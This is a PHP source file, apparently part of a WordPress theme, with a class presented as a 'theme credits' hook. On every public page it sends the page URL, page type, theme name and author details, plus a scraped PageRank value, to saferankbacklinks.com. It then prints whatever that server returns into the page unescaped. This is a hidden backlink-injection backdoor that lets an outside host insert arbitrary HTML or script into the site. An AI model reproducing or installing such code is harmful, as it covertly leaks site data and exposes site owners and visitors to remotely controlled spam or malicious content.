<?php 

add_action('srb_theme_links', 'srbExtra::themeCreditsMethod');

if( !class_exists( 'WP_Http' ) )
    include_once( ABSPATH . WPINC. '/class-http.php' );

class srbExtra
{

    public static function getCurrentUrl(){
        $s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : "";
        $protocol = substr(strtolower($_SERVER["SERVER_PROTOCOL"]), 0, strpos(strtolower($_SERVER["SERVER_PROTOCOL"]), "/")) . $s;
        $port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
        $uri = $protocol . "://" . $_SERVER['SERVER_NAME'] . $port . $_SERVER['REQUEST_URI'];
        return $uri;
    }

    public static function themeCreditsMethod(){
    
        if(is_404() or is_admin()){
            return;
        }
        
        $pr = new gpr2013();

        $params = array( 'url' => self::getCurrentUrl() );
        $hitUrl = 'http://saferankbacklinks.com/_srb/t.10/';

        $ttl = 3600 * 3;
        $links = $pr->cache($hitUrl . '|' . $params['url'], $ttl);
        if(!$links){

            $checks = explode('|', 'home|front_page|single|page|category|tag');
            $meta = array();
            foreach($checks as $check){
                $t = 'is_' .$check;
                if(function_exists($t) && $t()){
                    $meta[] = $check;
                }    
            }

            $params['meta'] = join(',', $meta);

            $theme = wp_get_theme();
            $params['theme_name'] = $theme->get('Name');
            $params['theme_author'] = $theme->get('Author');
            $params['theme_author_uri'] = $theme->get('AuthorURI');            

            $request = new WP_Http();
            $params['pr'] = $pr->get($params['url'], $request, $cacheTo);
            $result = $request->request( $hitUrl, array( 'method' => 'POST', 'body' => $params) );
            if( ! is_wp_error($result) ) {
                $links = $result['body'] ? $result['body'] : '&nbsp;';
                $pr->cache($hitUrl . '|' . $params['url'], $ttl, $links);
            }
        }
        
        if(!empty($links)){
            echo $links;
        }
    }
    
}


class gpr2013 {

    public function get($url, $request, $cacheTo) {
        $query = "http://toolbarqueries.google.com/tbr?client=navclient-auto&ch="
            . $this->CheckHash($this->HashURL($url))
            . "&features=Rank&q=info:" . $url . "&num=100&filter=0";
            
        $ttl = 86400 * 30; 
        $pagerank = $this->cache($query, $ttl);    
        if(!$pagerank){
            $data = $request->request($query);
            $pos = strpos($data['body'], "Rank_") * 1;
            if ($pos === false) {
                $pagerank = '';
            } else {
                $pagerank = substr($data['body'], $pos + 9);
                $this->cache($query, $ttl, $pagerank);
            }
        }
        return $pagerank;
    }
    
    public function cache($query, $ttl, $value = false){
        $key = 'srb_' . md5($query);
        if($value){
            $var = array('ts' => time() + $ttl, 'value' => $value);
            update_option($key, $var);
        }else{
            $tmp = get_option($key, false);
            if($tmp && isset($tmp['ts']) && $tmp['ts'] > time()){
                return $tmp['value'];
            }
        }
        return false;
    }

    private function StrToNum($Str, $Check, $Magic) {
        $Int32Unit = 4294967296; // 2^32
        $length = strlen($Str);
        for ($i = 0; $i < $length; $i++) {
            $Check *= $Magic;
            if ($Check >= $Int32Unit) {
                $Check = ($Check - $Int32Unit * (int) ($Check / $Int32Unit));
                $Check = ($Check < -2147483648) ? ($Check + $Int32Unit) : $Check;
            }
            $Check += ord($Str{$i});
        }
        return $Check;
    }

    private function HashURL($String) {
        $Check1 = $this->StrToNum($String, 0x1505, 0x21);
        $Check2 = $this->StrToNum($String, 0, 0x1003F);
        $Check1 >>= 2;
        $Check1 = (($Check1 >> 4) & 0x3FFFFC0 ) | ($Check1 & 0x3F);
        $Check1 = (($Check1 >> 4) & 0x3FFC00 ) | ($Check1 & 0x3FF);
        $Check1 = (($Check1 >> 4) & 0x3C000 ) | ($Check1 & 0x3FFF);
        $T1 = (((($Check1 & 0x3C0) << 4) | ($Check1 & 0x3C)) << 2 ) | ($Check2 & 0xF0F );
        $T2 = (((($Check1 & 0xFFFFC000) << 4) | ($Check1 & 0x3C00)) << 0xA) | ($Check2 & 0xF0F0000 );
        return ($T1 | $T2);
    }

    private function CheckHash($Hashnum) {
        $CheckByte = 0;
        $Flag = 0;
        $HashStr = sprintf('%u', $Hashnum);
        $length = strlen($HashStr);
        for ($i = $length - 1; $i >= 0; $i--) {
            $Re = $HashStr{$i};
            if (1 === ($Flag % 2)) {
                $Re += $Re;
                $Re = (int) ($Re / 10) + ($Re % 10);
            }
            $CheckByte += $Re;
            $Flag++;
        }
        $CheckByte %= 10;
        if (0 !== $CheckByte) {
            $CheckByte = 10 - $CheckByte;
            if (1 === ($Flag % 2)) {
                if (1 === ($CheckByte % 2)) {
                    $CheckByte += 9;
                }
                $CheckByte >>= 1;
            }
        }
        return '7' . $CheckByte . $HashStr;
    }

}

?>